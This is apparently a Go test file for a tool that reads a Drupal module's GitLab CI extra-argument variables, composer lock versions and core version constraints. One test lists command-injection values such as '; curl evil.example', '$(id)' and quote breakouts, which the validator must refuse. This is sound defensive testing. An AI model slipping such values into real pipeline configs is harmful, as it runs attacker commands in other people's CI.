package adapter

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// aModuleWith writes a module working copy carrying the given files.
func aModuleWith(t *testing.T, files map[string]string) string {
	t.Helper()

	dir := t.TempDir()
	for name, contents := range files {
		path := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatalf("mkdir: %v", err)
		}
		if err := os.WriteFile(path, []byte(contents), 0o644); err != nil {
			t.Fatalf("write: %v", err)
		}
	}

	return dir
}

// The module's own _*_EXTRA variables are read, because CI splices them into
// the same tools and a module using one gets a different verdict from a tool
// that ignores them.
func TestTheModulesOwnCheckArgumentsAreRead(t *testing.T) {
	dir := aModuleWith(t, map[string]string{".gitlab-ci.yml": `
variables:
  _PHPCS_EXTRA: '--exclude=Drupal.Commenting.FunctionComment'
  _PHPSTAN_EXTRA: '--level=1'
  _PHPUNIT_EXTRA: '--testsuite=unit'
`})

	extras := ReadCiExtras(dir)

	if extras.PhpCs != "--exclude=Drupal.Commenting.FunctionComment" {
		t.Errorf("phpcs: %q", extras.PhpCs)
	}
	if extras.PhpStan != "--level=1" {
		t.Errorf("phpstan: %q", extras.PhpStan)
	}
	if extras.PhpUnit != "--testsuite=unit" {
		t.Errorf("phpunit: %q", extras.PhpUnit)
	}
	if len(extras.Rejected) != 0 {
		t.Errorf("it refused something ordinary: %v", extras.Rejected)
	}
}

// GitLab lets a variable be a {value, description} mapping, which is the shape
// the template itself uses — so a module copying that shape is read too.
func TestAVariableDeclaredWithADescriptionIsRead(t *testing.T) {
	dir := aModuleWith(t, map[string]string{".gitlab-ci.yml": `
variables:
  _PHPCS_EXTRA:
    value: '--runtime-set ignore_warnings_on_exit 1'
    description: 'Tune phpcs'
`})

	if got := ReadCiExtras(dir).PhpCs; got != "--runtime-set ignore_warnings_on_exit 1" {
		t.Errorf("got %q", got)
	}
}

// A value that could end the command and begin another is refused, not quoted.
//
// These are spliced into a `bash -c`, and upkeep runs them against other
// people's contributions — a bot branch, a patch from a stranger — so the file
// is attacker-controlled in a way a project's own CI run is not. Multi-token
// values are the point of the variable, so the whole string cannot simply be
// quoted; refusing the dangerous shapes is what is left.
func TestAnArgumentThatCouldRunSomethingElseIsRefused(t *testing.T) {
	// The YAML is written per case rather than from one template, because the
	// quoting style decides what reaches the validator at all: a double-quoted
	// scalar processes backslash escapes and folds newlines, so the dangerous
	// characters have to be introduced the way YAML will preserve them. The
	// first version of this test was defeated by that and passed a value with
	// the backslash already removed.
	for name, pipeline := range map[string]string{
		"a second command":     "variables:\n  _PHPCS_EXTRA: '--colors; curl evil.example'\n",
		"a substitution":       "variables:\n  _PHPCS_EXTRA: '--colors $(id)'\n",
		"a backtick":           "variables:\n  _PHPCS_EXTRA: '--colors `id`'\n",
		"a pipe":               "variables:\n  _PHPCS_EXTRA: '--colors | tee /tmp/x'\n",
		"a redirect":           "variables:\n  _PHPCS_EXTRA: '--colors > /tmp/x'\n",
		"an ampersand":         "variables:\n  _PHPCS_EXTRA: '--colors & id'\n",
		"a backslash":          "variables:\n  _PHPCS_EXTRA: '--colors \\ id'\n",
		"an embedded newline":  "variables:\n  _PHPCS_EXTRA: \"--colors \\n id\"\n",
		"a quote to break out": "variables:\n  _PHPCS_EXTRA: \"--colors ' ; id ; '\"\n",
	} {
		extras := ReadCiExtras(aModuleWith(t, map[string]string{".gitlab-ci.yml": pipeline}))

		if extras.PhpCs != "" {
			t.Errorf("%s was accepted: %q", name, extras.PhpCs)
		}
		if !slices.Contains(extras.Rejected, "_PHPCS_EXTRA") {
			t.Errorf("%s was dropped without being reported: %v", name, extras.Rejected)
		}
	}
}

// And a refusal is said, because the verdict then differs from CI's by exactly
// those arguments — a mismatch nobody mentioned is the thing this exists to
// stop.
func TestARefusedArgumentIsReported(t *testing.T) {
	warning := RejectedExtrasWarning([]string{"_PHPCS_EXTRA"})

	for _, want := range []string{"_PHPCS_EXTRA", ".gitlab-ci.yml", "differ from CI"} {
		if !strings.Contains(warning, want) {
			t.Errorf("%q missing from the warning: %s", want, warning)
		}
	}
}

// Anything unreadable yields none rather than refusing to check the module: a
// missing or malformed .gitlab-ci.yml is not a reason to produce no verdict.
func TestAnUnreadablePipelineYieldsNoArguments(t *testing.T) {
	for name, files := range map[string]map[string]string{
		"no .gitlab-ci.yml":  {},
		"not YAML":           {".gitlab-ci.yml": "\tnot: [yaml"},
		"no variables block": {".gitlab-ci.yml": "stages:\n  - build\n"},
		"an empty value":     {".gitlab-ci.yml": "variables:\n  _PHPCS_EXTRA: ''\n"},
		"a structured value": {".gitlab-ci.yml": "variables:\n  _PHPCS_EXTRA: [a, b]\n"},
	} {
		extras := ReadCiExtras(aModuleWith(t, files))
		if extras.PhpCs != "" || extras.PhpStan != "" || extras.PhpUnit != "" {
			t.Errorf("%s produced arguments: %+v", name, extras)
		}
	}
}

// The standards versions come off the lock file, because two tools reporting
// different things about the same code is a mystery until you know they are
// different tools.
func TestTheStandardsVersionsAreReadFromTheLock(t *testing.T) {
	project := aModuleWith(t, map[string]string{"composer.lock": `{
		"packages": [{"name": "drupal/core", "version": "12.0.0-beta1"}],
		"packages-dev": [
			{"name": "drupal/coder", "version": "9.0.1"},
			{"name": "squizlabs/php_codesniffer", "version": "4.0.1"},
			{"name": "phpstan/phpstan", "version": "2.1.0"}
		]
	}`})

	versions := StandardsVersions(project)

	want := []string{
		"drupal/coder 9.0.1", "squizlabs/php_codesniffer 4.0.1", "phpstan/phpstan 2.1.0",
	}
	if strings.Join(versions, ", ") != strings.Join(want, ", ") {
		t.Errorf("got %v, want %v", versions, want)
	}
}

// A lock that cannot be read reports nothing rather than guessing: an absent
// version is better than a wrong one, and the checks still run.
func TestAnUnreadableLockReportsNoVersions(t *testing.T) {
	for name, files := range map[string]map[string]string{
		"no lock":         {},
		"not JSON":        {"composer.lock": "{nope"},
		"nothing of ours": {"composer.lock": `{"packages": [{"name": "psr/log", "version": "3.0.2"}]}`},
	} {
		if versions := StandardsVersions(aModuleWith(t, files)); len(versions) != 0 {
			t.Errorf("%s reported %v", name, versions)
		}
	}
}

// A check against a core the module does not declare is a preview, and says
// so before anybody reaches for phpcbf.
//
// The failure this exists for: a core-12 run uses coder 9 on PHPCS 4, a branch
// declaring ^10.3 || ^11 has CI on coder 8 and PHPCS 3, and on a real file the
// two wanted opposite formatting. phpcbf under coder 9 produced a file coder 8
// rejected, so the fix had to be rolled back — upkeep's advice broke the gate.
func TestACheckAgainstAnUndeclaredCoreSaysItIsAPreview(t *testing.T) {
	preview := StandardsPreview("jumplinks", "12", "^10.3 || ^11")

	if preview == "" {
		t.Fatal("no warning for a core the module does not declare")
	}
	for _, want := range []string{
		"jumplinks",    // which module
		"^10.3 || ^11", // what it actually declares
		"core 12",      // and what was checked
		"preview",      // how to read the findings
		"phpcbf",       // named, because that is the thing that breaks CI
		"CI that",      // and what it breaks
	} {
		if !strings.Contains(preview, want) {
			t.Errorf("%q missing from the warning: %s", want, preview)
		}
	}
}

// A declared core gets no warning: the standard is the one its CI uses, so the
// findings are a defect list and should read as one.
func TestADeclaredCoreGetsNoPreviewWarning(t *testing.T) {
	for name, constraint := range map[string]string{
		"exactly that core":   "^12",
		"among several":       "^10.3 || ^11 || ^12",
		"a range reaching it": ">=11.1",
	} {
		if got := StandardsPreview("jumplinks", "12", constraint); got != "" {
			t.Errorf("%s warned anyway: %s", name, got)
		}
	}
}

// Silence on not-knowing, like every other constraint read: warning about a
// mismatch that may not exist would train people to ignore the warning.
func TestNothingUnreadableProducesAPreviewWarning(t *testing.T) {
	for name, constraint := range map[string]string{
		"no constraint":   "",
		"unparseable":     "sometime after lunch",
		"only whitespace": "   ",
	} {
		if got := StandardsPreview("jumplinks", "12", constraint); got != "" {
			t.Errorf("%s warned: %s", name, got)
		}
	}
}

// The constraint comes off the working copy, because that is the code under
// test — including uncommitted edits, which is what --working-copy exists for
// and which no ref would carry.
func TestTheDeclaredConstraintIsReadFromTheWorkingCopy(t *testing.T) {
	dir := aModuleWith(t, map[string]string{
		"jumplinks.info.yml": "name: JumpLinks\ncore_version_requirement: ^10.3 || ^11\n",
	})

	if got := DeclaredCoreConstraint(dir, "jumplinks"); got != "^10.3 || ^11" {
		t.Errorf("got %q", got)
	}
	// A module with no info.yml at that name reads as nothing, not as a
	// mismatch.
	if got := DeclaredCoreConstraint(dir, "something_else"); got != "" {
		t.Errorf("it invented a constraint: %q", got)
	}
}
